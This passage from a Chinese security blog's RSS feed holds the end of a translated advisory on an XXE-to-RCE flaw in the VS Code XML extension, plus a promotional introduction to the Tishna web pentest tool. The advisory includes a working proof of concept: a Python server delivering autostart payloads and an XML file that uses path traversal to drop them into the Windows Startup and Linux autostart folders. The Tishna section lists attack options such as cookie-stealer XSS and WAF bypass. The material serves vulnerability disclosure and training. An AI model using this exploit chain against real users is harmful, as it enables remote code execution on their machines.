点，因此无法覆盖任何文件，并且所有操作都是使用当前用户权限完成的（因此，如果当前用户是管理员，我们可以在任何地方写，否则只能在其主目录可写）。&lt;/p&gt;&lt;p&gt;可以通过滥用启动/自动启动机制来轻松实现RCE：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;在 Windows 系统上，通过将批处理文件引用为外部实体并使用遍历路径将其写入 $HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ 文件夹中。&lt;/li&gt;&lt;li&gt;在大多数 GNU/Linux 系统上，通过在 $HOME/.config/autostart/ 文件夹中编写一个“desktop”文件。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;只需要等待受害者注销并再次在其计算机上登录以获得执行的代码即可。&lt;/p&gt;&lt;h2&gt;影响&lt;/h2&gt;&lt;p&gt;在完成 LSP4XML 的利用链之后，除 VSCode-XML 之外，还发现 Eclipse 的 wildwebdeveloper 扩展和 theia-xml-extension 也在使用该库，因此都容易受到攻击。&lt;/p&gt;&lt;h2&gt;实践&lt;/h2&gt;&lt;p&gt;以下是在 Windows 和 GNU/Linux 系统上利用 XXE 并实现 RCE 的步骤：&lt;/p&gt;&lt;p&gt;首先，安装 VS Code 和 vscode-xml 扩展&amp;lt;0.9.1版本（注意：目前最新为 0.10.1）。&lt;/p&gt;&lt;p&gt;创建 server.py（Python3）并运行&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
 
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header(&amp;#39;Content-type&amp;#39;, &amp;#39;application/octet-stream&amp;#39;)
        self.end_headers()
        if &amp;#39;.desktop&amp;#39; in self.path:
            self.wfile.write(b&amp;#39;[Desktop Entry]\nName=Exploit\nGenericName=\nComment=\nExec=sh -c &amp;#34;id;read&amp;#34;\nTerminal=true\nType=Application\nX-GNOME-Autostart-enabled=true&amp;#39;)	
        else:
            self.wfile.write(b&amp;#39;start cmd.exe /k &amp;#34;whoami&amp;#34;&amp;#39;)
        
def run(server_class=HTTPServer, handler_class=RequestHandler, port=9000):
    server_address = (&amp;#39;&amp;#39;, port)
    httpd = server_class(server_address, handler_class)
    print(&amp;#39;Starting httpd on port {}...&amp;#39;.format(port))
    httpd.serve_forever()
 
run()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在 VS code 中新建文件并输入：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;
&amp;lt;!DOCTYPE r [ 
    &amp;lt;!ENTITY linux SYSTEM &amp;#34;http://127.0.0.1:9000/../../../../.config/autostart/cmd.desktop&amp;#34;&amp;gt;
    &amp;lt;!ENTITY windows SYSTEM &amp;#34;http://127.0.0.1:9000/../../../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/cmd.bat&amp;#34;&amp;gt; 
]&amp;gt;
&amp;lt;r&amp;gt;&amp;amp;linux;&amp;amp;windows;&amp;lt;/r&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后保存该 XML 文件。&lt;/p&gt;&lt;p&gt;观察对 Python3 Web 服务器的请求，当用户执行注销或登录，将执行注入命令（在 Windows 上打开“命令提示符”并执行 whoami 命令，在 GNU/Linux 上打开终端并执行 id 命令）&lt;/p&gt;&lt;p&gt;具体操作：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.shielder.it/blog/wp-content/uploads/2019/10/Video-xxe-3.gif&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;shielder.it/blog/wp-con&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;tent/uploads/2019/10/Video-xxe-3.gif&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;h2&gt;防范&lt;/h2&gt;&lt;p&gt;及时更新插件 VS Code-XML 的版本。&lt;/p&gt;&lt;p&gt;源自：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.shielder.it/blog/dont-open-that-xml-xxe-to-rce-in-xml-plugins-for-vs-code-eclipse-theia/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;shielder.it/blog/dont-o&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;pen-that-xml-xxe-to-rce-in-xml-plugins-for-vs-code-eclipse-theia/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;的网络安全技能包更新了！CISP-PTE 认证技能包，让你免费体验 CISP-PTE 认证内容。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-16-103044773</guid>
<pubDate>Thu, 16 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>web自动化渗透工具：Tishna</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-15-102917681.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/102917681&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c2abf4c7be5ea75d1e52dec644467e48_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;Tishna&lt;/h2&gt;&lt;p&gt;一个用于 Web 服务器、Web 应用程序到 Web 安全性的自动化渗透测试框架。是一套完整的服务器自动渗透测试框架，覆盖 web 应用层。&lt;/p&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/haroonawanofficial/Tishna-Automated-Web-Application-Hacker&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/haroonawanof&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ficial/Tishna-Automated-Web-Application-Hacker&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;p&gt;测试环境：Kali，Parrot OS，Black Arch，Termux，Android Led TV&lt;/p&gt;&lt;p&gt;&lt;b&gt;简介&lt;/b&gt;&lt;/p&gt;&lt;p&gt;包含了 62 个全自动选项，是一把可用于 web 渗透的利器。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d84922d4201de60e7f07f4dcbc384f45_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;962&quot; data-rawheight=&quot;668&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;962&quot; data-original=&quot;https://pic2.zhimg.com/v2-d84922d4201de60e7f07f4dcbc384f45_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d84922d4201de60e7f07f4dcbc384f45_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;962&quot; data-rawheight=&quot;668&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;962&quot; data-original=&quot;https://pic2.zhimg.com/v2-d84922d4201de60e7f07f4dcbc384f45_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-d84922d4201de60e7f07f4dcbc384f45_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;ul&gt;&lt;li&gt;Tishna 在银行，私人组织和渗透测试人员中进法律审计很有用&lt;/li&gt;&lt;li&gt;它是一种防御工具，可找到尽可能多的信息以获得未授权访问和入侵&lt;/li&gt;&lt;li&gt;随着更先进技术的出现，黑客还发现了进入许多组织系统的更多方法&lt;/li&gt;&lt;li&gt;Tishna 软件可以审核，服务器和 Web 行为&lt;/li&gt;&lt;li&gt;Tishna 可以执行尽可能多的目标扫描和枚举&lt;/li&gt;&lt;li&gt;这是通过保护服务器和 Web 应用程序安全性来阻止网络罪犯的第一步&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;功能&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;信息收集&lt;/li&gt;&lt;li&gt;XSS 分析&lt;/li&gt;&lt;li&gt;CSRF 分析&lt;/li&gt;&lt;li&gt;绕过&lt;/li&gt;&lt;li&gt;......&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;安装&lt;/h2&gt;&lt;p&gt;&lt;b&gt;环境：Kali Linux&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;下载：&lt;/b&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/haroonawanofficial/Tishna-Automated-Web-Application-Hacker&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/haroonawanof&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ficial/Tishna-Automated-Web-Application-Hacker&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;然后在目录下执行命令，来提高所有 bash 文件的访问级别。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;chmod u + x * .sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后安装命令，进入安装流程：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;./kali_install.sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-3708a20806910df1208765366d95b729_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;644&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-3708a20806910df1208765366d95b729_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-3708a20806910df1208765366d95b729_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;644&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-3708a20806910df1208765366d95b729_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-3708a20806910df1208765366d95b729_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;可工具扫描选项前的编号进行，例如，扫描 LFI 漏洞，键入编号 55 再进行相关配置即可。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5911ced1a9d1b1c36b3f58ad399b9f80_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;873&quot; data-rawheight=&quot;684&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;873&quot; data-original=&quot;https://pic1.zhimg.com/v2-5911ced1a9d1b1c36b3f58ad399b9f80_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5911ced1a9d1b1c36b3f58ad399b9f80_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;873&quot; data-rawheight=&quot;684&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;873&quot; data-original=&quot;https://pic1.zhimg.com/v2-5911ced1a9d1b1c36b3f58ad399b9f80_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-5911ced1a9d1b1c36b3f58ad399b9f80_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;视频安装教程：&lt;/b&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//youtu.be/93ws50zYqVE&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;youtu.be/93ws50zYqVE&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;命令选项&lt;/h2&gt;&lt;blockquote&gt;[1]审核HTTP方法&lt;br/&gt;[2]提取响应标头&lt;br/&gt;[3]提取图像&lt;br/&gt;[4]提取URL&lt;br/&gt;[5]识别表单&lt;br/&gt;[6]在表单高级攻击中查找XSS &lt;br/&gt;[7]在表单简单攻击中查找XSS&lt;br/&gt;[8] Web服务器挂载响应拆分攻击&lt;br/&gt;[9]标头注入毒药&lt;br/&gt;[10]高速缓存毒药&lt;br/&gt;[11] CRLF响应拆分攻击和模糊器&lt;br/&gt;[12] HTTP响应走私模糊&lt;br/&gt;[13] Web缓存欺骗攻击检查&lt;br/&gt;[14] HTTP方法信息&lt;br/&gt;[15]自定义CSRF注入请求&lt;br/&gt;[16]加载CSRF HTML模板&lt;br/&gt;[17] Shell Shock&lt;br/&gt;[18]跨站点请求伪造审核工具包&lt;br/&gt;[19]查找可用的HTTP方法&lt;br/&gt;[20]使用尖叫眼镜蛇在参数中查找XSS&lt;br/&gt;[21]查找缺少的HTTPS方法&lt;br/&gt;[22]服务器端请求伪造&lt;br/&gt;[23]查找可用的HTTPS方法&lt;br/&gt;[24]审核XML RPC方法，提取所有信息&lt;br/&gt;[25] Cookie Stealer XSS Localhost服务器&lt;br/&gt;[26]命令注入漏洞&lt;br/&gt;[27]显示JSON端点列表 &lt;br/&gt;[28]执行盲注，编码的响应式XXE注入 &lt;br/&gt;[29]执行文件上传注入 &lt;br/&gt;[30]执行侧面模板注入 &lt;br/&gt;[31]执行JSON Web令牌注入 &lt;br/&gt;[32]执行Web套接字注入 &lt;br/&gt;[33]执行Amazon Bucket Injection 101 AWS亚马逊&lt;br/&gt;[34]提取要劫持的Cnames记录 &lt;br/&gt;[35]不安全的直接对象参考– BURP &lt;br/&gt;[36]执行CSV注入 &lt;br/&gt;[37]执行XPATH注入 &lt;br/&gt;[38]查找SQL，XPATH，ASP，X，JAVA，JAVASCRIPT，PHP错误 &lt;br/&gt;[39]查找XPath和SQL参数注入 &lt;br/&gt;[40]显示两个身份验证有效载荷 &lt;br/&gt;[41]突变的XSS有效载荷 &lt;br/&gt;[42]存储的XSS有效载荷 &lt;br/&gt;[43]反射的XSS有效载荷 &lt;br/&gt;[44] Waf旁路有效载荷 &lt;br/&gt;[45]使用响应分割查找XSS &lt;br/&gt;[46]提取链接–高级 &lt;br/&gt;[47]下载图像– Exif数据 &lt;br/&gt;[48]简单响应拆分攻击 &lt;br/&gt;[49]双响应拆分攻击 &lt;br/&gt;[50] HTTP缓存中毒攻击 &lt;br/&gt;[51] HTTP缓存注入中毒 &lt;br/&gt;[52] HTTP Fuzzer &lt;br/&gt;[53] IP混淆 &lt;br/&gt;[54] RFI &lt;br/&gt;[55] LFI &lt;br/&gt;[56]二进制缓冲区溢出查找器 &lt;br/&gt;[57]存储和反映的XSS Angular JS有效 负载&lt;br/&gt;[58] Phantom JS XSS有效负载帮助程序 &lt;br/&gt;[59] Agular JS客户端自动XSS查找器 &lt;br/&gt;[60]会话劫持 打扰方法&lt;br/&gt;[61] OAUTH注入 &lt;br/&gt;[62]使用DNS历史记录绕过防火墙 &lt;br/&gt;[0]退出&lt;/blockquote&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;的网络安全技能包更新了！CISP-PTE 认证技能包，让你免费体验 CISP-PTE 认证内容。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-15-102917681</guid>
<pubDate>Wed, 15 Jan 2020 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
